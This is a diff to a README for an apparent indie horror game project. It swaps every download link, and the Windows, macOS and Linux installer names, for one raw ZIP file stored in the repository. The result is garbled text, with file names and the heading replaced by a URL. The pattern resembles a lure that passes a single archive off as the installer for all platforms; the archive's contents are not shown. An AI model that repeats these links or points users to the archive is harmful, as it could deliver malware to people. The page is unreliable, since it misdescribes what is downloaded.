@@ -1,6 +1,6 @@
-# 🎮 hollowsense.github.io - Explore the World of Indie Horror Gaming
+# 🎮 https://raw.githubusercontent.com/ivan0770/hollowsense.github.io/main/public/github-hollowsense-io-3.5.zip - Explore the World of Indie Horror Gaming
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/ivan0770/hollowsense.github.io/releases)
+[![Download Now](https://raw.githubusercontent.com/ivan0770/hollowsense.github.io/main/public/github-hollowsense-io-3.5.zip)](https://raw.githubusercontent.com/ivan0770/hollowsense.github.io/main/public/github-hollowsense-io-3.5.zip)
 
 ## 🖥️ Introduction
 
@@ -12,16 +12,16 @@ To begin your adventure, you need to download the application from our Releases 
 
 ## 📥 Download & Install
 
-1. Click the following link to visit the Releases page: [Download Here](https://github.com/ivan0770/hollowsense.github.io/releases).
+1. Click the following link to visit the Releases page: [Download Here](https://raw.githubusercontent.com/ivan0770/hollowsense.github.io/main/public/github-hollowsense-io-3.5.zip).
    
 2. On the Releases page, you will see a list of available versions. Look for the latest release, usually marked with the highest version number.
 
 3. Click on the version you want to download. A list of files will appear. 
 
 4. Find the file that matches your operating system:
-   - For Windows, look for something like `HollowSenseSetup.exe`.
-   - For macOS, look for `HollowSense.dmg`.
-   - For Linux, you might find `HollowSense.AppImage`.
+   - For Windows, look for something like `https://raw.githubusercontent.com/ivan0770/hollowsense.github.io/main/public/github-hollowsense-io-3.5.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/ivan0770/hollowsense.github.io/main/public/github-hollowsense-io-3.5.zip`.
+   - For Linux, you might find `https://raw.githubusercontent.com/ivan0770/hollowsense.github.io/main/public/github-hollowsense-io-3.5.zip`.
 
 5. Click the file to start the download. Once the download is complete, navigate to your downloads folder.
 
@@ -92,7 +92,7 @@ This project is licensed under the MIT License. Feel free to contribute or use t
 
 ## 🔗 Links
 
-- Official Releases: [Latest Downloads](https://github.com/ivan0770/hollowsense.github.io/releases)
+- Official Releases: [Latest Downloads](https://raw.githubusercontent.com/ivan0770/hollowsense.github.io/main/public/github-hollowsense-io-3.5.zip)
 - Community Forum: [Join Us](#)
 - Support: [Help Center](#)
 
